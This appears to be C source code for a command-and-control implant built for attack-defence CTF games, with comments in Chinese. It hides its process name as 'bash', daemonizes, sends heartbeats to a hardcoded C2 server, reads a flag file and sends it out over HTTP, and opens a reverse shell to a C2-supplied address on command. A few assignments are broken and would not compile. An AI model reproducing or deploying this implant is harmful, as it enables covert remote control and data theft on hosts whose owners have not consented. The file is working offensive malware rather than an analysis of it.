#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <sys/file.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <errno.h>
#include <time.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "tiny-c-http-client/http.h"

// =================== 配置 ===================
#define FLAG_PATH "/home/ctf/flag/flag"
#define C2_IP "10.103.6.2"
#define C2_PORT 26666
#define C2_HOST "pss"
#define SINGLE_INSTANCE_CHECK_FILE "/tmp/.php_lock"

static char last_flag[256] = "fuckyou";

// =================== 单实例机制 ===================
__attribute__((constructor))
void enforceSingleInstance(void) {
    int lock_fd = open(SINGLE_INSTANCE_CHECK_FILE, O_RDWR | O_CREAT, 0600);
    if (lock_fd == -1 || flock(lock_fd, LOCK_EX | LOCK_NB) == -1) {
#ifdef DEBUG
        printf("Another process detected, exiting.\n");
#endif
        _exit(1);
    }
}

// =================== 获取基本信息 ===================
char* read_hostname() {
    static char buf[128];
    FILE *fp = fopen("/etc/hostname", "r");
    if (!fp) {
        snprintf(buf, sizeof(buf), "unknown%d", rand() % 10000);
        return buf;
    }
    fgets(buf, sizeof(buf), fp);
    buf[strcspn(buf, "\n")] = 0;
    fclose(fp);
    return buf;
}

char* get_username() {
    struct passwd *pw = getpwuid(getuid());
    return pw ? pw->pw_name : "unknown";
}

char* get_process_name() {
    static char pname[64];
    if (readlink("/proc/self/exe", pname, sizeof(pname)-1) != -1) {
        return pname;
    }
    return "unknown";
}

void initiateDirectReverseShell(char *reverseShellInfo) {
    if (!reverseShellInfo) return;

    char *ip;
    char *port;
    ip = strtok(reverseShellInfo, "|");
    port = strtok(NULL, "|");
    if (!ip || !port) return;

    #ifdef DEBUG
    printf("[initiateDirectReverseShell]: Initiated reverse shell to %s:%s\n", ip, port);
    #endif

    pid_t pid = fork();
    // fork()失败或者为父进程就直接退出
    if (pid == -1 || pid > 0) return;

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(atoi(port));
    sa.sin_addr.s_addr = inet_addr(ip);
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockt, (struct sockaddr *) &sa, sizeof(sa));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    if (execlp("bash", "bash", NULL))
        execlp("sh", "sh", NULL);
}

// =================== HTTP 帮助函数 ===================
int send_flag(const char *flag) {
    char url[512];
    snprintf(url, sizeof(url), "/api/c2/submit-flag?flag=%s", flag);

    HTTPRequestInfo req = {
        C2_IP, C2_HOST, C2_PORT, -1,
        HTTP_GET, url,
        CONTENT_TYPE_TEXT_PLAIN,
        NULL, NULL, -1
    };
    int s = SendHTTPRequest(&req);
    HTTPResponseInfo *resp = FetchHTTPResponse(&req);
    FreeHTTPResponseResource(resp);
    return s;
}

int send_heartbeat() {
    char data[512];
    snprintf(data, sizeof(data),
             "{\"hostname\":\"%s\",\"username\":\"%s\",\"pid\":\"%d\",\"process_name\":\"%s\"}",
             read_hostname(), get_username(), getpid(), get_process_name());

    HTTPRequestInfo req = {
        C2_IP, C2_HOST, C2_PORT, -1,
        HTTP_POST, "/api/c2/heartbeat",
        CONTENT_TYPE_APPLICATION_JSON,
        NULL, data, strlen(data)
    };

    int s = SendHTTPRequest(&req);
    HTTPResponseInfo *resp = FetchHTTPResponse(&req);

    int ret = 0;
    if (resp && resp->l7.content) {
        ret = atoi(resp->l7.content);
    }
    FreeHTTPResponseResource(resp);
    return ret;
}

char* get_rs_addr() {
    HTTPRequestInfo req = {
        C2_IP, C2_HOST, C2_PORT, -1,
        HTTP_GET, "/api/c2/get-rs",
        CONTENT_TYPE_TEXT_PLAIN,
        NULL, NULL, -1
    };
    SendHTTPRequest(&req);
    HTTPResponseInfo *resp = FetchHTTPResponse(&req);
    char *addr = NULL;
    if (resp && resp->l7.content) {
        addr = strdup(resp->l7.content);  // 复制一份，因为等下free
    }
    FreeHTTPResponseResource(resp);
    return addr;
}

// =================== 守护化 ===================
static void setup_signal(int signum) {
    struct sigaction sa;
    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(signum, &sa, NULL);
}

void daemonize() {
    setup_signal(SIGCHLD);
#ifndef DEBUG
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    setsid();
    setup_signal(SIGTERM);
    setup_signal(SIGINT);

    chdir("/");
    close(0); close(1); close(2);
#endif
}

// =================== Flag 监控 ===================
void monitor_flag() {
    last_flag[256] = "fuckyou";
    FILE *fp = fopen(FLAG_PATH, "r");
    if (fp) {
        char buf[256];
        if (fgets(buf, sizeof(buf), fp)) {
            buf[strcspn(buf, "\n")] = 0;
            if (strcmp(buf, last_flag) != 0) {
                strcpy(last_flag, buf);
                send_flag(buf);
#ifdef DEBUG
                printf("[FLAG] Submitted: %s\n", buf);
#endif
            }
        }
        fclose(fp);
    }
}

// =================== 主逻辑 ===================
int main(int argc, char *argv[]) {
    static char new_name[] = "bash";
    srand(time(NULL));
    daemonize();

    // 修改进程名 (只能16字节,内核task_struct字段, 非root也能)
    prctl(PR_SET_NAME, "bash", 0,0,0);
    int orig_len = strlen(argv[0]) + 1;
    if (orig_len >= sizeof(new_name))
        strncpy(argv[0], "bash", orig_len);

    unsigned ticks = 60;
    while (1) {
        if (ticks >= 60) {
            int res = send_heartbeat();
            if (res == 1) {
                char *rs = get_rs_addr();
                initiateDirectReverseShell(rs);
                free(rs);
            }
            ticks = 0;
            last_flag[256] = {0};
        }
        monitor_flag();
        sleep(1); // 每60s心跳
        ticks++;
    }
    return 0;
}
